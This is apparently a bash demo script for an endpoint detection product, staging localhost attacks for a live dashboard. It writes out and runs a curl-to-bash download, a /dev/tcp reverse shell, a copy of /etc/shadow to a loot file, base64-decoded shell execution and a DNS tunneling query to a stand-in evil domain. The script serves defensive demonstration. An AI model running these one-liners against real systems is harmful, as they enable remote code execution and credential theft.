#!/usr/bin/env bash
# ─────────────────────────────────────────────────────────────────────────────
# Project SENTINEL — Live Attack Demo (LOCALHOST-ONLY, SAFE)
#
# Every command targets 127.0.0.1 — no external traffic, nothing leaves the box.
# Run as root on the machine where the Sentinel agent is installed.
# The dashboard (http://localhost:5000) must be visible on the projector.
#
# Usage:  sudo ./demo/attack.sh
# ─────────────────────────────────────────────────────────────────────────────
set -u

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YEL='\033[1;33m'; NC='\033[0m'
say()  { echo -e "${CYAN}[*]${NC} $1"; }
act()  { echo -e "${YEL}[▶ STAGE]${NC} $1"; }
ok()   { echo -e "${GREEN}[✓]${NC} $1"; }
pause(){ echo -e "\n${YEL}———— press ENTER for the next stage ————${NC}"; read -r; }

HUB="http://127.0.0.1:5000"
WORK=$(mktemp -d)
trap 'kill $(jobs -p) 2>/dev/null; rm -rf "$WORK"' EXIT

banner() {
  clear
  echo -e "${RED}"
  cat <<'EOF'
  ┌─────────────────────────────────────────────────────────┐
  │   SENTINEL LINEAGE EDR — LIVE ATTACK DEMONSTRATION      │
   └─────────────────────────────────────────────────────────┘
EOF
  echo -e "${NC}"
}

# ─── Pre-flight ───
banner
say "Pre-flight checks…"
systemctl is-active --quiet sentinel-agent && ok "agent: RUNNING" || {
  echo -e "${RED}[✗] sentinel-agent is not running. Start it: sudo systemctl start sentinel-agent${NC}"; exit 1; }
systemctl is-active --quiet sentinel-hub && ok "hub: RUNNING" || {
  echo -e "${RED}[✗] sentinel-hub is not running. Start it: sudo systemctl start sentinel-hub${NC}"; exit 1; }
curl -sf "$HUB/api/v1/stats" >/dev/null && ok "API: reachable" || {
  echo -e "${RED}[✗] API unreachable at $HUB${NC}"; exit 1; }
ok "All green. Dashboard should be on screen: $HUB"
pause

# ─── STAGE 1 — Pipe-to-shell (supply-chain pattern) ───
banner
act "STAGE 1 — Supply-chain attack: 'curl | bash'"
say  "An attacker gets a user to paste a one-liner from a forum."
say  "Rule expected: #2001/#2002 Pipe Download Execute — ACTION: KILL"
echo -e "${YEL}  payload server on 127.0.0.1:8099 (local, benign script)${NC}"
( cd "$WORK" && printf '#!/bin/sh\nid\nwhoami\nuname -a\n' > payload.sh && python3 -m http.server 8099 --bind 127.0.0.1 >/dev/null 2>&1 & )
sleep 1
echo -e "\n${RED}\$ curl -s http://127.0.0.1:8099/payload.sh | bash${NC}"
curl -s http://127.0.0.1:8099/payload.sh | bash
sleep 2
say  "→ The download pipeline was killed before the payload could run."
say  "→ Watch the dashboard: CRITICAL badge, rule 2001/2002, lineage killed."
pause

# ─── STAGE 2 — Reverse shell ───
banner
act "STAGE 2 — Reverse shell to a local listener"
say  "The classic: bash -i >& /dev/tcp/… — rules #1002 + #1003 — ACTION: KILL"
echo -e "\n${RED}\$ bash -i >& /dev/tcp/127.0.0.1/4444 2>&1${NC}"
timeout 4 bash -i >& /dev/tcp/127.0.0.1/4444 2>&1 || true
sleep 2
say  "→ Killed on execution. If a listener was on 4444, it never got a prompt."
pause

# ─── STAGE 3 — Credential access ───
banner
act "STAGE 3 — Credential access: /etc/shadow"
say  "Rule expected: #3001 Shadow File Access — ACTION: KILL"
echo -e "\n${RED}\$ cat /etc/shadow > /tmp/.loot${NC}"
cat /etc/shadow > /tmp/.loot 2>/dev/null || true
sleep 2
rm -f /tmp/.loot
say  "→ The reader dies before writing anything useful."
pause

# ─── STAGE 4 — Obfuscated payload ───
banner
act "STAGE 4 — Base64-obfuscated payload execution"
say  "Encoding doesn't help — rule #2004 matches the DECODE-TO-SHELL chain."
echo -e "\n${RED}\$ echo <payload> | base64 -d | bash${NC}"
echo "aWQ7IHVuYW1lIC1h" | base64 -d | bash 2>/dev/null || true
sleep 2
say  "→ Killed. The obfuscation is irrelevant to lineage analysis."
pause

# ─── STAGE 5 — Covert channel (ALERT, not KILL — variety) ───
banner
act "STAGE 5 — DNS tunneling attempt"
say  "Rule #9003 — ACTION: ALERT (shows non-kill response classes too)"
DNS=$(head -c 24 /dev/urandom | base64 | tr -d '=+/' | head -c 20)
echo -e "\n${RED}\$ dig @127.0.0.1 ${DNS}.tunnel.evil.tk${NC}"
timeout 3 dig @127.0.0.1 "${DNS}.tunnel.evil.tk" >/dev/null 2>&1 || true
sleep 2
say  "→ Logged as HIGH alert in the timeline with MITRE T1071.004."
pause

# ─── Wrap-up ───
banner
echo -e "${GREEN}  DEMO SEQUENCE COMPLETE${NC}\n"
say  "On the dashboard, walk through:"
say  "  1. Timeline — every stage, color-coded, MITRE tags visible"
say  "  2. Click a lineage → process tree + events + techniques"
say  "  3. BLOCK a lineage → SIGKILL; re-run an attack → dead at exec"
say  "  4. Mini metrics — event rate, kills over time"
echo ""
curl -s "$HUB/api/v1/stats" | python3 -m json.tool | head -12
echo ""
ok   "Stats above are LIVE from the kernel — nothing pre-recorded."
